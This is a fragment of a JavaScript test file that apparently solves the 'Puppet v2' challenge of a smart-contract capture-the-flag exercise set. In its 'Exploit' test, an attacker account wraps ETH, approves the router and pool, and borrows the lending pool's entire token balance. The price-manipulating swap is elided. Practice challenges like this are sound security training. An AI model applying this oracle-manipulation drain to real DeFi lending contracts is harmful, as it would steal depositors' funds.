...
describe("[Challenge] Puppet v2", function () {
    ...
    it("Exploit", async function () {
        ...
        [deployer, attacker] = await ethers.getSigners();
        const balanceTokens = await this.token.balanceOf(attacker.address);
        const amountUsed = ethers.utils.parseEther('29.8')

        await this.token.connect(attacker).approve(this.uniswapRouter.address, balanceTokens);
        ...
        await this.weth.connect(attacker).deposit({value: amountUsed})
        await this.weth.connect(attacker).approve(this.lendingPool.address, amountUsed)

        const borrowBalance = await this.token.balanceOf(this.lendingPool.address);
        await this.lendingPool.connect(attacker).borrow(borrowBalance.toString());
    });
